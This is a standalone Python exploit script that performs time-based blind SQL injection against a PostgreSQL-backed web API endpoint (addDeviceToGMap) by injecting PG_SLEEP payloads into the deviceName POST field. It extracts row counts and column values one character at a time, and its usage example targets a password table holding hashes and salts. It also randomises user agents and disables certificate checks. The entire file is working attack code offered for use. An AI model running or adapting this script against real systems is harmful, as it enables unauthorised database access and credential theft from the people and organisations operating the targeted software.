#!/usr/bin/python3
import requests
import urllib3
import os
import sys
import re
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 10

# Specific settings for DBMS queries
prefix = "'"
and_or = " AND "
junk_str = "ABCD"
junk_int = "1234"
inj_prefix = prefix + and_or + junk_int

# Decimal begin and end
dec_begin = 48
dec_end = 57

# ASCII char begin and end
ascii_begin = 32
ascii_end = 126

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

# Custom headers
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    headers = {
        'User-Agent': useragent,
    }
    return headers

# Perform the SQLi call for injection
def sqli(url,headers,inj_str,sleep):
    # Optionally modify injection string via regex for character evasion
    inj_regex_str = re.sub(" ","+",inj_str)                     # Replace space for +
    inj_regex_str = re.sub("'","$$",inj_regex_str)              # Replace single quote for $$
    # Parameters for POST
    post_data = {'apiKey':'337635c37532ca507fabde2f6265e816',
                'deviceName':inj_str,
                'longitude':'1',
                'latitude':'1'}
    # Do the request
    r = requests.post(url, data=post_data ,headers=headers, timeout=timeout, verify=False)
    # Check response timing
    res = r.elapsed.total_seconds()
    if res >= sleep:
        return True
    elif res < sleep:
        return False
    else:
        print("[!] Something went wrong checking responses. Check responses manually. Exiting.")
        exit(-1)

# Extract rows
def get_rows(url,headers,table,sleep):
    rows = ""
    max_pos_rows = 10
    # Get number maximum positional characters of rows: e.g. 1096,2122,1234,etc.
    for pos in range(1,max_pos_rows+1):
        # Test if current pos does have any valid value. If not, break
        direction = ">"
        inj_rows = inj_prefix + "=(CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(COUNT(*) AS VARCHAR(10000))::text,(CHR(" + str(ascii_begin) + "))) FROM " + table + ")::text FROM " + str(pos) + " FOR 1))" + direction + "1) THEN (SELECT " + junk_int + " FROM PG_SLEEP(" + str(sleep) + ")) ELSE " + junk_int + " END) AND '" + junk_str + "'='" + junk_str
        if not sqli(url,headers,inj_rows,sleep):
            break
        # Loop decimals
        direction = "="
        for num_rows in range(dec_begin,dec_end+1):
            row_char = chr(num_rows)
            inj_rows = inj_prefix + "=(CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(COUNT(*) AS VARCHAR(10000))::text,(CHR(" + str(ascii_begin) + "))) FROM " + table + ")::text FROM " + str(pos) + " FOR 1))" + direction + str(num_rows) + ") THEN (SELECT " + junk_int + " FROM PG_SLEEP(" + str(sleep) + ")) ELSE " + junk_int + " END) AND '" + junk_str + "'='" + junk_str
            if sqli(url,headers,inj_rows,sleep):
                rows += row_char
                print(row_char,end='',flush=True)
                break
    if rows != "":
        print("\n[*] Found " + rows + " rows of data in table '" + table + "'\n")
        return int(rows)
    else:
        return 0

# Loop through positions and characters
def get_data(url,headers,row,column,table,sleep):
    extracted = ""
    null = "NULL"
    max_pos_len = 50

    # Loop through length of string
    # Not very efficient, should use a guessing algorithm
    print("[*] Extracting strings from row " + str(row+1) + "...")
    for pos in range(0,max_pos_len):
        # Loop through ASCII printable characters
        for guess in range(ascii_begin,ascii_end+1):
            extracted_char = chr(guess)
            direction = "="
            inj_str = inj_prefix + "=(CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(" + column + " AS VARCHAR(10000))::text,(CHR(" + str(ascii_begin) + "))) FROM " + table + " ORDER BY " + column + " OFFSET " + str(row) + " LIMIT 1)::text FROM " + str(pos) + " FOR 1))" + direction + str(guess) + ") THEN (SELECT " + junk_int + " FROM PG_SLEEP(" + str(sleep) + ")) ELSE " + junk_int + " END) AND '" + junk_str + "'='" + junk_str
            if sqli(url,headers,inj_str,sleep):
                extracted += chr(guess)
                print(extracted_char,end='',flush=True)
                break
    return extracted

# Main
def main(argv):
    if len(sys.argv) == 5:
        columns = sys.argv[1].split(",")
        table = sys.argv[2]
        url = sys.argv[3]
        sleep = int(sys.argv[4])
    else:
        print("[*] Usage: " + sys.argv[0] + " <column1,column2,..> <table> <url> <sleep_in_seconds>")
        print("[*] Example: " + sys.argv[0] + " password_id,password,algorithm,salt aaapassword http://192.168.252.9/api/json/discovery/addDeviceToGMap 3\n")
        exit(0)

    # Random headers
    headers = http_headers()

    # Do stuff
    try:
        # Getting rows
        print("[*] Printing number of rows in table...")
        rows = get_rows(url,headers,table,sleep)

        # Getting values for found rows in specified columns
        for column in columns:
            print("[*] Retrieving " + str(rows) + " rows of data using '" + column + "' as column and '" + table + "' as table...")
            for row in range(0,rows):
                retrieved = get_data(url,headers,row,column,table,sleep)
                print("\n[*] Retrieved value '" + retrieved + "' for column '" + column + "' in row " + str(row+1))
    
        # Done
        print("\n[+] Done!\n")
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + e)
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()
        exit(-1)

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
